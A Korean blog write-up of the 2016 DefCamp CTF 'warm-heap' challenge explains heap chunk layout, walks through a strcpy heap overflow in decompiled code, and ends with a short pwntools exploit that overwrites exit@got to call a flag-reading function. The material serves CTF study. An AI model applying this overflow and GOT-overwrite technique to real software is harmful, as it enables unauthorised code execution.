---
title: "2016 DefCamp CTF warm-heap"
date: 2019-12-23
tags: [DefCamp]
categories: [Pwn]
published: false
---

Heap Chunk 공부하고자 간단한 Heap Overflow문제를 풀어봤다.

```c
v3 = malloc(16uLL);
```

![](https://user-images.githubusercontent.com/32904385/71335900-3ef14280-2588-11ea-91e8-90097356dda1.png)

16만큼 malloc 해주면 heap 영역에 이렇게 할당되는데 chunk 구조를 보면 64bit 바이너리니까 header에서  `prev_size`와 `size`는 각각 8바이트씩을 차지할거다. 빨간 부분은 `prev_size` , 노란부분은 `size`,  분홍부분은 `mem` 영역일 것이다. 

16만큼 동적할당 해줬으니 사이즈는 총 32일 것이다. 0x20이 아니라 0x21인 이유는 `prev_inuse`가 하위 1비트가 들어가기 때문이다. 현재 chunk가 사용중이므로 1로 설정되어있다. free되면 0이 된다.

```c
*v3 = 1;
```

![](https://user-images.githubusercontent.com/32904385/71335811-d73af780-2587-11ea-833d-e4f2e31fc256.png)

prev_size와 size를 제외하고 다음부터 우리가 할당해준 mem부분이다. 메모리에 1이라는 값을 저장해준다.

```c
*(v3 + 1) = malloc(8uLL);
```

![](https://user-images.githubusercontent.com/32904385/71336728-be344580-258b-11ea-8839-c8416c478361.png)

이 코드로 다음 chunk 주소가  malloc mem안에 들어가게 된다.

```c
v4 = malloc(16uLL);
*v4 = 2;
```

![](https://user-images.githubusercontent.com/32904385/71337150-a8c01b00-258d-11ea-8790-da59aff33a89.png)

이것도 그냥 16만큼 malloc해주고 값을 넣어줬다.

```c
*(v4 + 8) = malloc(8uLL);
```

![](https://user-images.githubusercontent.com/32904385/71337255-28e68080-258e-11ea-8300-a9dc345aa173.png)

이것도 다음 chunk 주소가 malloc mem에 들어가게 된다.

```c
fgets(&input, 4096, stdin);
strcpy(*(v3 + 1), &input);
fgets(&input, 4096, stdin);
strcpy(*(v4 + 8), &input);
exit(0);
```

`0x0000000001CCF090`이 input부분인데 strcpy로 *(v3+1) 에 복사해주고 있다. 여기서 40바이트를 넣고 이 뒤에 다음부터 Heap Oveflow내서 chunk 부분을 덮어쓸 수 있다.

```c
void __noreturn sub_400826()
{
  __int128 lineptr; // [rsp+0h] [rbp-20h]
  FILE *stream; // [rsp+10h] [rbp-10h]
  unsigned __int64 v2; // [rsp+18h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  lineptr = 0uLL;
  stream = fopen("flag", "r");
  getline(&lineptr, &lineptr + 1, stream);
  puts(lineptr);
  fflush(stdout);
  free(lineptr);
  _exit(1);
}
```

그래서 40바이트만큼 덮고 그 뒤에 함수의 exit@got주소를 넣고 flag를 읽어주는 함수로 바꿔주면 exit(0);가 됐을 때 flag를 읽어주는 함수가 실행된다.

> exploit.py

```python
from pwn import *

e = ELF('./exp100.bin')
p = process('./exp100.bin')

flag = 0x400826
payload = 'A'*40
payload += p64(e.got['exit'])
p.sendline(payload)
p.sendline(p32(flag))
p.interactive()
```



 